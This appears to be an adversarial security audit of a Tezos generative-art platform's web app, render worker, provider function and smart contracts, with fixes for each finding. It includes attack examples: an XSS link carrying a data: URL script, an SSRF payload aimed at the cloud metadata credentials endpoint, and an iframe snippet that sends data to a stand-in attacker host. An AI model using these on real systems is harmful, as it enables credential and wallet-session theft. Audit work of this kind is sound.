# Aleatory — Adversarial Security Audit

**Scope:** full repository at `main` (`77c1af7`), top to bottom — Next.js front end, the sandbox shell, the Cloudflare render worker, the Netlify render-provider function, the SmartPy contracts, and the deploy scripts.

**Date:** 2026-08-25

**Method:** static review of every tracked source file, tracing each trust boundary from untrusted input to sink. No live testing was performed against deployed contracts or hosts. Where a finding depends on runtime behaviour I could not observe, it is marked **unverified** and says what to check.

**Standing caveat:** `node_modules` is not installed in this working copy, so `tsc` and the SmartPy compiler could not be run. Findings below are from reading source, not from executing it.

---

## Trust boundaries

The system has six places where untrusted data crosses into privileged code. Every serious finding sits on one of them.

| # | Boundary | Who controls the input | What sits on the other side |
|---|---|---|---|
| 1 | Artist generator code → browser | Anyone who deploys a collection | Every visitor's browser, on an origin that holds wallet session state |
| 2 | Artist generator code → render worker | Same | A headless Chrome inside Cloudflare's network |
| 3 | On-chain contract storage → provider function | **Anyone**, permissionlessly | Pinata key, Tezos agent signing key, outbound `fetch` |
| 4 | Collector/artist form input → wallet signature | The visitor | Their own funds |
| 5 | Arbitrary `collection` address → marketplace | Anyone | Escrowed tokens and tez |
| 6 | CDN → generator record | jsDelivr / anyone who can MITM it | Bytes hashed and written immutably on chain |

The recurring theme: **the codebase's comments describe controls that the shipped code does not implement.** The design in the docstrings is largely sound. The gap between the docstrings and the artifacts is where the vulnerabilities are.

---

## Findings by severity

| ID | Severity | Title |
|---|---|---|
| [C1](#c1) | **Critical** | Arbitrary JS execution on the app's own origin via the sandbox shell's `?code=` parameter |
| [C2](#c2) | **Critical** | Unauthenticated SSRF with exfiltration in the render-provider function |
| [C3](#c3) | **Critical** | Provider serves any contract that emits a `set_provider` event; agent key signs calls to attacker contracts |
| [H1](#h1) | High | Provider function is unauthenticated and has no idempotency, despite claiming one |
| [H2](#h2) | High | Served sandbox CSP is far weaker than the one in source; "no network at render time" is not enforced |
| [H3](#h3) | High | Every collection is born trusting the resolver, whose admin can then write metadata into all of them |
| [H4](#h4) | High | Marketplace accepts arbitrary `collection` addresses; fake listings render on `/market` |
| [H5](#h5) | High | No security headers of any kind on the application origin |
| [M1](#m1) | Medium | Render worker auth bypass when `RENDER_TOKEN` is unset; no body size limit |
| [M2](#m2) | Medium | Worker request interception misses WebSocket/WebRTC; harness overrides are trivially escaped |
| [M3](#m3) | Medium | A reverting royalty recipient permanently bricks all marketplace sales for a collection |
| [M4](#m4) | Medium | CDN dependency is hashed but not pinned — supply-chain compromise becomes immutable on chain |
| [M5](#m5) | Medium | `blakejs` and `fflate` are imported but undeclared in `package.json` |
| [M6](#m6) | Medium | Registry entries can be made permanently undeletable |
| [M7](#m7) | Medium | Deploy defaults silently collapse admin / operator / agent onto one key |
| [M8](#m8) | Medium | Unvalidated price input reaches the wallet as `NaN`, zero, or an unbounded amount |
| [M9](#m9) | Medium | Provider function returns internal error strings to the caller |
| [M10](#m10) | Medium | Marketplace constructor does not enforce the fee ceiling `set_fee` does |
| [L1–L12](#low) | Low | Header hygiene, input validation, precision, dead code, drift |

---

<a name="c1"></a>
## C1 — Critical: arbitrary JS execution on the app's own origin

**Files:** `public/sandbox/index.html:101-118`, `netlify.toml:11-19`, `src/context/WalletContext.tsx:74-83`

The sandbox shell reads a URL from the query string, fetches it, and writes the response into the document:

```js
var code = q.get("code") || "";
var url = code.indexOf("ipfs://") === 0
  ? "https://ipfs.fileship.xyz/" + code.slice(7)
  : code;                                   // ← any scheme, any host, no validation

fetch(url)
  .then(r => r.text())
  .then(html => {
      document.open();
      document.write(html);                 // ← executes as this origin
      document.close();
  });
```

There is no allowlist, no scheme check, and no origin check on `code`.

This is safe **only** when the page is framed with `sandbox="allow-scripts"`, which puts it in an opaque origin. `ArtifactFrame.tsx:34` and `SandboxFrame.tsx:197` both do that correctly. But nothing forces the page to be reached that way:

1. `public/` is served by Next at the site root, so **`https://<app>/sandbox/index.html` is a live, directly navigable URL on the application's own origin.**
2. `netlify.toml:11-14` adds `/sandbox/* → /sandbox/index.html` with status 200, so *any* path under `/sandbox/` serves the shell too.
3. `netlify.toml:18` sets `script-src 'unsafe-inline' 'unsafe-eval' https:` for that path, which explicitly permits the inline scripts `document.write` injects.

**Exploit.** Send a target this link:

```
https://<app>/sandbox/x?code=data:text/html,<script>/* payload */</script>
```

`fetch()` resolves `data:` URLs, so no attacker-hosted infrastructure is even required. The payload executes with the application's origin.

**Impact.** `WalletContext.tsx:76-81` enumerates `localStorage` for keys prefixed `beacon:` — the Beacon wallet session lives in this origin's `localStorage`. Script running here can read it, and can also drive the connected `DAppClient` to construct operation requests, which is one wallet confirmation away from moving a visitor's funds. The served CSP's `connect-src https:` permits exfiltration to any host.

`SANDBOX_ORIGIN` in `src/lib/config.ts:52` defaults to `https://sandbox.aleatory.art`, and `renderUrl()` (`src/lib/piece.ts:61-67`) points frames there. That is the correct design. The problem is that a **second copy of the same shell ships on the app origin** via `public/`, and that copy is reachable directly.

**Fix.**
1. Do not ship the shell under `public/`. Serve it only from the dedicated sandbox host. If `SandboxFrame` needs a same-site shell for local dev, gate it behind a dev-only path.
2. Refuse to load anything but `ipfs://` from `?code=`, and resolve the CID against the configured gateway. Reject `data:`, `blob:`, `javascript:`, `file:`, and bare `http(s)://`.
3. Add a frame-ancestors-style guard: `if (window.top === window.self) { fail("must be framed"); return; }` — cheap defence in depth that kills the top-level navigation path outright.
4. Tighten the served CSP (see [H2](#h2)).

---

<a name="c2"></a>
## C2 — Critical: unauthenticated SSRF with exfiltration to IPFS

**File:** `netlify/functions/provider.mts:104-199, 289-334`

`render()` fetches a URL taken directly from contract storage:

```ts
const codeUrl = piece.codeUri.startsWith("ipfs://")
    ? `https://ipfs.fileship.xyz/${piece.codeUri.slice(7)}`
    : piece.codeUri;                        // ← arbitrary URL, straight from chain

const html = await fetch(codeUrl).then(...)
```

`piece.codeUri` comes from `pendingIn()` (line 111), which reads `art.code_uri` out of a contract's storage. **The factory is permissionless** (`aleatory.py:910`, "(Anyone, payable) Originate a collection") and the only validation is `sp.len(params.code_uri) > 0` (`aleatory.py:951`). So any attacker can put any string in `code_uri` for a few mutez of origination burn.

**Exploit.** Deploy a collection with `code_uri = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"` (or the Lambda runtime API, or any internal host reachable from Netlify's function network). The provider function fetches it, ships the body to the render worker as `html`, the worker renders it in a browser, and the resulting PNG is **pinned to public IPFS and written into the token's metadata on chain.**

This is not a blind SSRF. The response body is rendered to an image and published to a public, permanent, attacker-readable location. Error strings from failed fetches are also returned in the HTTP response body ([M9](#m9)), giving a second read channel for probing.

**Aggravating factors.**
- The handler has **no authentication** (see [H1](#h1)), so an attacker triggers the fetch on demand rather than waiting for the 5-minute cron.
- There is no size limit on the fetch, so a large response is also a memory DoS.
- `codeUri` is never validated as an `ipfs://` URI anywhere in the pipeline.

**Fix.**
1. Accept `ipfs://<cid>` only. Validate the CID shape, resolve it against your own gateway, and reject everything else outright. There is no legitimate reason for a provider to fetch an arbitrary `http://` URL.
2. Cap the response size (`Content-Length` check plus a streaming byte counter) and set a fetch timeout.
3. Combine with the collection-authenticity check in [C3](#c3) — an attacker who cannot get their contract into the work queue cannot reach this sink at all.

---

<a name="c3"></a>
## C3 — Critical: the work queue accepts any contract that emits the right event

**File:** `netlify/functions/provider.mts:67-95, 235-252`

`collectionsServed()` finds work by querying TzKT for `set_provider` events **across every contract on the chain**, then filtering on the event payload:

```ts
const events = await tzkt("/v1/contracts/events", { tag: "set_provider", limit: 1000 });

for (const e of events) {
    if (e.payload?.provider === PROVIDER_ADDRESS)
        named.add(e.contract.address);      // ← the event asserts its own legitimacy
}
```

An event payload is entirely under the emitting contract's control. Anyone can deploy a contract whose sole purpose is `sp.emit(sp.record(provider=<aleatory provider>), tag="set_provider")`. There is no check that the contract was originated by the factory, that it implements the collection interface, or that it actually pays render gas.

Once a hostile contract is in the set, `pendingIn()` reads *its* storage for `code_uri`, `pending_metadata`, `administrator`, and its token list — every one of which the attacker controls — and then `publish()` signs a transaction **to that attacker contract** with the agent key:

```ts
const tezos = new TezosToolkit(RPC);
tezos.setSignerProvider(await InMemorySigner.fromSecretKey(AGENT_SK));
const collection = await tezos.contract.at(piece.collection);   // ← attacker's contract
await collection.methodsObject.set_token_metadata({...}).send();
```

**Impact.**
- **Free rendering and pinning at your expense**, indefinitely. Every fake token consumes a render-worker invocation and a Pinata pin, neither of which the attacker paid render gas for.
- **Gas drain on the agent key.** The attacker's `set_token_metadata` entrypoint can burn as much gas as the operation permits, on every call.
- **The delivery vehicle for [C2](#c2).** The attacker needs a contract in this set to point `code_uri` anywhere.
- The `ALEA_FACTORY_ADDRESS` branch (lines 78-92) *does* verify provenance correctly — it enumerates `creator: factory` and checks `storage.render.provider`. The event branch bypasses that check entirely, and both feed the same `named` set.

A secondary issue in the same function: the event query takes the first 1000 `set_provider` events with no ordering or recency logic, so a collection that switched *away* to another provider is still served, because its old event remains in the stream.

**Fix.**
1. Verify every candidate before queueing it, regardless of how it was discovered: read the contract's own storage and confirm `render.provider === PROVIDER_ADDRESS`. The storage is the authority; the event is only a hint about where to look. The code already does this on the factory path — apply it to both.
2. Additionally confirm the contract's script hash matches the known collection template, or that its originator is a factory you recognise. The design intends to serve third-party factories, so make that an explicit allowlist rather than "anything that says the right words."
3. Consider requiring evidence of payment (a `buy` event whose `render_gas` actually arrived at the provider contract) before spending a render on a piece.

---

<a name="h1"></a>
## H1 — High: the provider function is unauthenticated and not idempotent

**File:** `netlify/functions/provider.mts:16-19, 289-334`

Two problems in one handler.

**No authentication.** `handler(req, _context)` never inspects `req` — not the method, not headers, not a shared secret. The docstring says "The mint UI calls this after a buy lands," so it is intended to be publicly callable. Every invocation runs up to `BATCH = 5` renders, pins, and on-chain transactions. An attacker with a `while true; do curl ...; done` loop drives your Pinata bill, your Cloudflare render budget, and your agent's gas consumption at no cost to themselves.

**The claimed idempotency does not exist.** The docstring states:

> Idempotency follows zolturd-mint.mts: claim a row with a conditional update so exactly one attempt wins, persist the operation hash at injection before waiting for confirmation, and reconcile against the chain with three outcomes where the indeterminate one is never retried.

None of that is implemented. There is no claim, no persisted state, no reconciliation — the function comment says the code holds no database, which is precisely why the described protocol cannot work. What actually happens is a bare read-then-act loop over `pendingIn()`. Two concurrent invocations (the cron firing while a UI ping is in flight, or two attacker requests) will both see the same pending token and both proceed to render it, pin it, and call `set_token_metadata`.

**Consequences of the race:**
- Duplicate renders and duplicate Pinata pins — paid twice, and two distinct CIDs for one token.
- **Taquito counter collisions.** Each `publish()` constructs a fresh `TezosToolkit` and `InMemorySigner` (line 236-237) and reads the agent's counter independently. Concurrent invocations will inject operations with the same counter; one is rejected, and under sustained concurrency the agent can be wedged.
- The on-chain `ALREADY_PUBLISHED` guard (`aleatory.py:620-622`) does save you from *double-writing* metadata — the second call reverts. That is real and worth crediting. But it converts wasted money into a failed operation rather than preventing the waste.

**Fix.**
1. Require a shared secret on the ping path (`Authorization: Bearer …`, compared with a constant-time comparison), or drop the ping entirely and rely on the cron. Netlify scheduled functions and HTTP-invoked functions can be separate deployments.
2. Add a real claim mechanism. Netlify Blobs, Upstash, or any small KV gives you the conditional write the docstring describes. A per-token lock with a TTL is enough.
3. Serialise `publish()` calls behind a single toolkit/signer instance and manage the counter explicitly, or accept one in-flight operation at a time.
4. Rate-limit by IP and cap total work per unit time, not just per invocation.
5. **Correct the docstring.** A comment asserting a safety property the code lacks is worse than no comment — it stops the next reader from looking.

---

<a name="h2"></a>
## H2 — High: the served sandbox CSP is much weaker than the one in source

**Files:** `netlify.toml:16-19` vs `src/lib/sandbox.ts:28-39`

`src/lib/sandbox.ts` builds a genuinely locked-down policy and injects it as a `<meta>` tag:

```
default-src 'none'; script-src 'unsafe-inline' 'unsafe-eval'; style-src 'unsafe-inline';
img-src data: blob:; media-src data: blob:; font-src data:;
connect-src 'none'; frame-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'
```

That is correct, and `connect-src 'none'` makes "a piece never touches the network" structural, exactly as the comment claims.

What is actually served for `/sandbox/*` is:

```
default-src 'none'; script-src 'unsafe-inline' 'unsafe-eval' https:; style-src 'unsafe-inline' https:;
img-src data: blob: https:; connect-src https:; font-src data: https:
```

`connect-src https:` permits `fetch()` to any HTTPS host. `script-src https:` permits loading remote scripts. The network prohibition is not enforced at all for the shell that actually ships.

This matters because **the strict policy is on a code path that does not run.** `buildSandboxDoc()` is only called by `src/components/studio/SandboxFrame.tsx`, which (a) imports from `../../lib/aleatory/params`, `../../lib/aleatory/runtime`, and `../../lib/aleatory/sandbox` — a directory that does not exist in this repo — and (b) speaks a `sandbox:doc` / `sandbox:ready` postMessage protocol that `public/sandbox/index.html` does not implement. The shipped shell takes `?code=` and fetches. The two halves have drifted apart, and the half with the security controls is the dead one.

**Consequences.** Every determinism and isolation guarantee the docs make about rendering is currently advisory:
- A piece can phone home at render time, so the same token renders differently for different viewers.
- A piece can fingerprint and track viewers from within what the docs call a network-isolated frame.
- Combined with [C1](#c1), the permissive `script-src` is what makes the injected payload fully functional.

**Fix.** Bring the served header in line with the source policy: drop `https:` from `script-src`, `style-src`, `img-src`, and `font-src`, and set `connect-src 'none'`. Add `frame-ancestors` naming only the app origin, plus `object-src 'none'`, `base-uri 'none'`, `form-action 'none'`. Then either repair `SandboxFrame.tsx` to import from the real paths and match the shell's protocol, or delete it and `src/lib/sandbox.ts` so there is one sandbox implementation rather than two.

---

<a name="h3"></a>
## H3 — High: collections are born trusting the resolver

**File:** `contract/aleatory.py:270-281, 539-579, 984-1027`

Every collection, from both the direct constructor and the factory, is initialised with `trust_resolver=True`. `may_write_media_` consults the resolver as a fallback authoriser:

```python
if not allowed and self.data.render.trust_resolver:
    resolved = sp.view("is_writer", self.data.render.resolver, who, sp.bool)
    allowed = resolved == sp.Some(True)
```

The resolver's administrator can `add_writer(anyone)` (`aleatory.py:203-209`), and that writer can then call `set_token_metadata` on **every collection deployed against that resolver** that has not explicitly opted out.

The contract is admirably honest about this — the `AleatoryResolver` docstring states the cost plainly, and `set_trust_resolver` gives artists a real escape. Two things still make it worth flagging:

1. **The default is on, and opting out is a separate transaction the artist must know to send.** Security defaults should be the safe direction; here the unsafe direction is free and the safe one costs gas and awareness. Most artists will never call it.
2. **`set_token_metadata` writes a token's *entire* metadata document,** not just an image field. A compromised resolver admin key or a compromised writer can publish, for any unrevealed token in any trusting collection, a metadata document with an arbitrary name, description, image, `creators`, and TZIP-21 `royalties` block. Marketplaces that read royalties from the JSON rather than from `get_royalties` would honour the forged numbers.

The `ALREADY_PUBLISHED` write-once guard bounds this to *unrevealed* tokens, which is a genuine and well-designed limit. But every collection has a window between mint and reveal, and a freshly deployed collection is entirely within it.

**Fix.**
- Default `trust_resolver` to `False` and let the factory set it to `True` only when the artist opts in during `deploy`. That is a one-field change to the `deploy` parameter record.
- Surface the resolver-trust state prominently in the collection UI so artists can see the authority they are extending.
- Treat the resolver admin key as the highest-value key in the system and hold it accordingly (hardware, multisig, or a timelock on `add_writer`). Right now `deploy.ts` defaults it to the deployer key — see [M7](#m7).

---

<a name="h4"></a>
## H4 — High: the marketplace lists tokens from arbitrary contracts

**Files:** `contract/marketplace.py:126-173, 202-267`, `src/lib/market.ts:78-84`, `src/app/market/page.tsx:12`

`list_token` takes `collection` as a caller-supplied address and performs no validation on it:

```python
self.data.listings[listing_id] = sp.record(seller=sp.sender, collection=collection, ...)
sp.transfer([...], sp.mutez(0),
    sp.contract(t_transfer_batch, collection, entrypoint="transfer").unwrap_some(error="BAD_COLLECTION"))
```

The only requirement is that `collection` exposes a `transfer` entrypoint with the FA2 batch type. An attacker deploys a contract whose `transfer` is a no-op, lists an imaginary token at any price, and a listing appears in the marketplace's `listings` big map with nothing escrowed behind it.

`fetchListings()` reads that big map wholesale with no filter on collection, and `/market` renders every row it returns. So the attacker's fake listing appears on the site alongside genuine ones, showing a shortened contract address and a price.

When a visitor buys it (`marketplace.py:203`), the contract takes their tez, splits it, sends the remainder to the attacker, and issues a token transfer that the attacker's contract silently ignores. **The buyer pays and receives nothing.** Nothing in the contract or the UI distinguishes this from a real sale.

`accept_offer` (line 320) has the same shape, though it is self-harming rather than profitable for an attacker, so it matters less.

The escrow model is otherwise sound. I traced the balance accounting through `buy`, `make_offer`, `cancel_offer`, `accept_offer`, and `withdraw_fees`: payouts never exceed what came in, `fees_accrued` stays consistent with the contract balance, listing and offer ids are never reused, and the royalty budget clamp correctly bounds total royalties at 2500 bps so the `remaining` mutez subtraction cannot underflow. Re-entrancy is not exploitable — Tezos defers internal operations until after storage commits, and both `buy` and `accept_offer` delete the listing/offer before any `sp.send`. Those are all done right.

**Fix.**
- **Front end (do this first, it is cheap and immediate):** filter `fetchListings()` to collections originated by the known factory. `fetchCollections(CONTRACTS.factory)` already gives you that set, and `fetchListingFor` should apply the same check. An unrecognised collection should either be hidden or rendered with an explicit "not an Aleatory collection — unverified" warning.
- **Contract (for a future version):** either check that the collection was originated by a known factory, or verify escrow actually happened. A practical version of the latter: have `list_token` transfer the token in, then require a follow-up confirmation, or check `balance_of` via the on-chain view before accepting the listing as live.
- Note that the marketplace deliberately has no `admin_lambda`, so a deployed instance cannot be patched. This one is worth resolving before mainnet.

---

<a name="h5"></a>
## H5 — High: no security headers on the application origin

**File:** `netlify.toml`

The only `[[headers]]` block in the repository applies to `/sandbox/*`. The application origin — every page that loads the wallet — sends no `Content-Security-Policy`, no `X-Content-Type-Options`, no `Referrer-Policy`, no `Strict-Transport-Security`, no `X-Frame-Options`/`frame-ancestors`, and no `Permissions-Policy`.

Consequences:
- **No CSP means no second line of defence** behind [C1](#c1), and none behind any future injection bug.
- **The app can be framed by anyone.** With a wallet-connected dApp, that is a clickjacking surface against the transaction-confirmation flow.
- Token metadata is attacker-controlled and flows into image sources. `convertIpfsToGatewayUrl` (`src/utils/ipfs.ts:19-23`) passes any non-`ipfs://` URI straight through, and `ArtifactFrame.tsx:40` renders it in a raw `<img src>`. A hostile `displayUri` pointing at `https://tracker.example/x.png` makes every visitor's browser beacon to an attacker-chosen host, with no CSP to stop it. The same value reaches `openGraph.images` in `generateMetadata`.
- Related: `next.config.ts:8-12` defines an `images.remotePatterns` allowlist of three IPFS gateways, but the codebase uses plain `<img>` with `// eslint-disable-next-line @next/next/no-img-element` rather than `next/image`. **The allowlist is decorative** — it constrains a component that is never used.

**Fix.** Add a `[[headers]] for = "/*"` block with, at minimum:

```
Content-Security-Policy = "default-src 'self'; img-src 'self' data: https://ipfs.fileship.xyz https://ipfs.io https://cloudflare-ipfs.com; frame-src https://sandbox.aleatory.art; connect-src 'self' https://api.shadownet.tzkt.io https://rpc.tzkt.io; frame-ancestors 'none'; base-uri 'self'; object-src 'none'"
X-Content-Type-Options = "nosniff"
Referrer-Policy = "strict-origin-when-cross-origin"
Strict-Transport-Security = "max-age=63072000; includeSubDomains"
Permissions-Policy = "geolocation=(), microphone=(), camera=()"
```

Tune `script-src` to what Next.js needs — it will require `'unsafe-inline'` or a nonce for hydration. Separately, validate `displayUri`/`thumbnailUri`/`artifactUri` at the boundary: if it is not `ipfs://`, do not render it.

---

<a name="m1"></a>
## M1 — Medium: render worker auth and resource limits

**File:** `worker/render.ts:45-61, 63-68`

```ts
if (request.headers.get("authorization") !== `Bearer ${env.RENDER_TOKEN}`) {
    return new Response("Unauthorized", { status: 401 });
}
```

Three issues:

1. **Fail-open on missing secret.** If `RENDER_TOKEN` is unset (a fresh deploy, a forgotten `wrangler secret put`, a rolled-back binding), `env.RENDER_TOKEN` is `undefined` and the template literal produces the string `"Bearer undefined"` — which any caller can send. `wrangler.toml` comments correctly note that "a workers.dev URL is public," which makes this the only thing standing between the internet and the render budget. Add an explicit `if (!env.RENDER_TOKEN) return new Response("Not configured", { status: 503 })`.
2. **Non-constant-time comparison.** `!==` on strings short-circuits. Over a network this is hard to exploit, but a constant-time compare costs nothing.
3. **No request body size limit.** `body.html` is unbounded and goes straight into `page.setContent()`. A large payload is a memory DoS on the worker.

Also, the hard-kill timer is a no-op in the case it was written for:

```ts
let browser: Browser | null = null;
const killer = setTimeout(() => { void browser?.close(); }, HARD_KILL_MS);
try {
    browser = await puppeteer.launch(env.BROWSER);   // ← if this hangs, browser stays null
```

If `puppeteer.launch` itself hangs, the timer fires while `browser` is still `null` and does nothing. Race the launch against a timeout instead.

---

<a name="m2"></a>
## M2 — Medium: render-time isolation is bypassable

**Files:** `worker/render.ts:79-87`, `src/lib/runtime.ts` (harness `blocked()` overrides)

Two layers claim to prevent a piece from reaching the network at render time; both can be stepped around.

**Puppeteer request interception** (`render.ts:80-87`) aborts everything that is not `data:`, `blob:`, or `about:blank`. That covers HTTP requests. It does **not** cover WebSocket handshakes or WebRTC data channels, neither of which flows through the request-interception pipeline. Artist code can open a WebSocket from inside the render browser and both exfiltrate and receive data — which, combined with [C2](#c2) and [C3](#c3), means an attacker-controlled page renders inside your Cloudflare browser with an outbound channel.

**The harness overrides** in `runtime.ts` (`window.fetch = blocked(...)`, `XMLHttpRequest.prototype.open`, `WebSocket`, `EventSource`, `Worker`, `navigator.sendBeacon`) are patches on one realm's globals. Any page can obtain a fresh, unpatched realm in three lines:

```js
const f = document.createElement("iframe");
document.body.appendChild(f);
f.contentWindow.fetch("https://attacker/?" + data);   // pristine fetch
```

The harness comments correctly frame these as reporting rather than blocking — "The CSP does the blocking; this only reports it." That is the right mental model. The problem is that the CSP which would actually block it is the one that is not being served ([H2](#h2)).

**Fix.** Serve the strict CSP (`connect-src 'none'`, `frame-src 'none'`) so the structural control is real. In the render worker, also inject a CSP via `page.setExtraHTTPHeaders` or a `<meta>` prepended to `body.html` before `setContent`, since request interception alone is not sufficient. Treat the JS overrides as telemetry only, and say so in the docs so nobody builds a guarantee on them.

---

<a name="m3"></a>
## M3 — Medium: a reverting royalty recipient bricks all sales for a collection

**File:** `contract/marketplace.py:227-243, 361-374`

The royalty loop sends to each recipient:

```python
cut = sp.split_tokens(sp.amount, share, 10000)
if cut > sp.mutez(0):
    remaining -= cut
    sp.send(recipient.key, cut)
```

The surrounding comment states the design intent:

> a hostile one could claim 100% and take the seller's proceeds, or claim more than is left and make every sale of its tokens fail. So the total honoured is clamped

The clamp handles the *amount* attack correctly — I verified the budget arithmetic bounds total royalties at 2500 bps and the `remaining` subtraction cannot underflow. But the clamp does nothing about a recipient that **rejects the transfer.** If a royalty address is a KT1 with no `default` entrypoint, or one whose `default` always fails, the internal operation fails and the entire `buy` reverts.

A collection's `royalties` map is set at origination and has no setter anywhere in `aleatory.py`, so this is permanent for that collection. Every marketplace sale of every one of its tokens fails forever. Sellers can still `delist` and offerers can still `cancel_offer`, so nothing is trapped — but the pieces are untradeable on your marketplace while remaining tradeable on objkt (which handles this differently). It also occurs by accident, not just by malice: a well-meaning artist naming a contract address as a royalty recipient produces the same outcome.

The same failure mode applies to the `sp.view("get_royalties", ...)` call, which can consume unbounded gas on a hostile collection and fail the sale.

**Fix.** The standard remedy is a pull pattern: accrue royalties into a per-address big map and add a `claim_royalties` entrypoint, so a failing recipient only affects itself. Failing that, validate at `deploy` that every royalty recipient is a `tz1`/`tz2`/`tz3` implicit account. Either way, correct the comment so it does not claim a protection broader than what it delivers.

---

<a name="m4"></a>
## M4 — Medium: the CDN dependency is hashed but not pinned

**File:** `src/lib/runtimes.ts:88-94, 168-190`

```ts
export const P5_DEP: DepSpec = {
    id: "p5", version: "1.5.0",
    url: "https://cdn.jsdelivr.net/npm/p5@1.5.0/lib/p5.min.js",
    approxBytes: 1_050_000,
};

export async function resolveDep(spec: DepSpec): Promise<ResolvedDep> {
    const res = await fetch(spec.url);
    const source = await res.text();
    const hash = blake2bHex(bytes, undefined, 32);   // ← hashes whatever arrived
    ...
}
```

There is no `expectedHash` on `DepSpec` and no comparison. The function computes the hash of whatever the CDN returned and records it as truth. `buildRecord()` (`record.ts:307-317`) then writes that hash into the generator record with `location: "manifest"`, and the record goes on chain immutably.

If jsDelivr is compromised, or a developer's connection is intercepted, or the version is ever republished, the injected bytes are inlined into the artist's document, executed in every viewer's browser, and their hash is recorded on chain as the canonical dependency — permanently, with the chain vouching for it.

The comments describe v1 moving this to an on-chain Deps contract addressed by hash, which resolves the problem properly. Until then, pinning is a two-line fix.

**Fix.** Add `expectedHash: string` to `DepSpec`, hard-code the known-good blake2b of p5 1.5.0, and throw in `resolveDep` on mismatch. Add SRI to any script tag that references it. Better still, vendor the file into the repo — a megabyte of pinned bytes is cheaper than an unpinnable trust dependency on a third party.

---

<a name="m5"></a>
## M5 — Medium: undeclared dependencies

`src/lib/record.ts:15` imports `blakejs`; `src/lib/project.ts:11` imports `fflate`. **Neither appears in `package.json`.** They resolve today only because something else in the tree hoists them into `node_modules`.

This means the version actually used is whatever a transitive dependency happened to pin, it can change or vanish on any unrelated dependency bump, and it is invisible to `npm audit` and to any SBOM. For `blakejs` specifically — the library computing the hashes that get written immutably on chain — that is a poor thing to leave to chance. Add both as explicit direct dependencies with pinned versions.

---

<a name="m6"></a>
## M6 — Medium: registry entries can be made permanently undeletable

**File:** `contract/aleatory.py:832-849`

```python
operator = sp.view("get_operator", provider, (), sp.address).unwrap_some(error="NOT_A_PROVIDER")
assert sp.sender == operator, "NOT_OPERATOR"
```

`register` requires only `get_render_gas` and `get_agent`. `deregister` requires `get_operator`. A contract can satisfy the first two and not the third — or satisfy all three at registration and later become unable to answer `get_operator` (a view that fails on some storage state, for instance).

Such an entry can never be removed by anyone: not its own operator, not the registry admin (there isn't one), not you. `self.data.count` is likewise permanently inflated. Repeat a few thousand times and the provider list is unusable, bounded only by origination burn.

The permissionless-by-design stance is deliberate and defensible. But "no one can remove an entry except its operator" becomes "no one can remove this entry, ever" the moment the operator check itself is unanswerable.

**Fix.** Require all three views at `register` time, so an entry that cannot be deregistered can never be created. Have the front end tolerate junk entries gracefully (it mostly does — `fetchProviders` catches per-row failures). Consider a `deregister_unreachable` path that any caller may invoke when `get_operator` fails, since such an entry is by definition non-functional.

---

<a name="m7"></a>
## M7 — Medium: deploy defaults collapse the key separation

**File:** `contract/deploy.ts:196-199, 234-243`

```ts
const admin    = process.env.ALEA_ADMIN_ADDRESS    || deployer;
const treasury = process.env.ALEA_TREASURY_ADDRESS || admin;
const agent    = process.env.ALEA_AGENT_ADDRESS    || deployer;
```

`.env.example` ships all three blank. Run the deploy without filling them in — which is the path of least resistance — and:

- the resolver's writer set becomes `[deployer]`
- the provider's `operator` **and** `agent` both become the deployer
- the factory and marketplace administrators become the deployer
- the treasury becomes the deployer

The `AleatoryProvider` docstring explains at length why these are separate:

> `operator` is the cold key that configures and withdraws, `agent` is the hot key a render daemon uses… A leaked agent key is rotated in one operation and gives an attacker no money.

The defaults collapse that into a single key which must then live in a Netlify environment variable as `ALEA_AGENT_SK` in order for the provider function to sign. A leak of that hot key would hand over the resolver admin (→ metadata write access to every trusting collection, [H3](#h3)), the factory admin (→ `admin_lambda` over factory storage), the marketplace admin, and the treasury.

**Fix.** Refuse to deploy when `ALEA_ADMIN_ADDRESS` or `ALEA_AGENT_ADDRESS` is unset, in the same style as the existing `PUBLIC_TEZOS_NETWORK` and `ALEA_MARKET_FEE_BPS` guards — those are good, this should join them. At minimum, refuse when `agent === admin`. Also verify against the deployed shadownet instances in `contract/deployments/shadownet.json` whether this already happened; if so, rotate before mainnet.

A related note on the same file: `fallbackLimits()` (line 96-103) submits `storageLimit: limits.storagePerOperation` — the protocol maximum. Burn is charged on bytes actually used, so this is usually harmless, but it authorises the maximum possible storage burn on an operation whose size you were unable to estimate. Prefer a measured ceiling.

---

<a name="m8"></a>
## M8 — Medium: unvalidated price input reaches the wallet

**File:** `src/components/piece/PieceMarket.tsx:119, 140, 171`

```ts
const mutez = Math.round(parseFloat(price) * 1_000_000);
await ops.listToken(client, contract, tokenId, mutez);
```

`price` is free text from an `inputMode="decimal"` field. The only guard is `disabled={busy !== null || !price}`, which checks for emptiness and nothing else.

- `"abc"` → `parseFloat` gives `NaN` → `ops.listToken` passes it to `String(amountMutez)` → `"NaN"` in the operation parameters.
- `"0.0000001"` → rounds to `0` mutez → a free listing, silently.
- `"-5"` → a negative amount.
- `"1e30"` → an absurd value, accepted without comment.
- A fat-fingered `"1000"` instead of `"1"` on the **offer** field escrows a thousand tez with no confirmation step, because `makeOffer` sends the amount as `sp.amount`.

Most of these fail at the node or in the wallet, so this is a correctness and user-safety issue rather than a direct exploit. The offer case is the one that loses real money to a typo. Note also that `PriceBreakdown` at line 140 recomputes `parseFloat(price || "0")` independently, so the number shown and the number sent are computed twice from the same unvalidated string.

**Fix.** Parse once, validate (`Number.isFinite`, `> 0`, sane upper bound), and derive both the preview and the operation from the validated integer. Add an explicit confirmation for offers above a threshold.

Two adjacent notes:
- `MintPanel.tsx:35` sends `""` as the params document with a comment saying "Parameters are not exposed in this panel yet." The whole `params.ts` resolution machinery — which is careful, well-specified work — is unreachable from the mint flow. Every piece currently mints with empty parameters.
- `src/lib/market.ts:57, 66` use `parseInt` on mutez strings. Values above 2^53 lose precision, which would make `sp.amount == listing.price` fail. Not reachable at realistic prices, but `BigInt` is the correct type here.

---

<a name="m9"></a>
## M9 — Medium: internal error strings returned to callers

**File:** `netlify/functions/provider.mts:314, 319-326`

```ts
errors[key] = (e as Error).message;
...
return Response.json({ collections: ..., published: ..., results, errors });
...
return new Response(`Provider run failed: ${(e as Error).message}`, { status: 500 });
```

Error messages propagate from `render()` (`render ${res.status}: ${await res.text()}` — the render worker's raw response body), from `pin()` and `pinJson()` (Pinata status codes), and from Taquito (RPC URLs, node errors). Combined with the unauthenticated handler ([H1](#h1)), an attacker can enumerate internal state, confirm which URLs are reachable from the function's network, and use the response as a side channel for the SSRF in [C2](#c2).

`results` also returns on-chain operation hashes for work done, which is public data, so that part is fine.

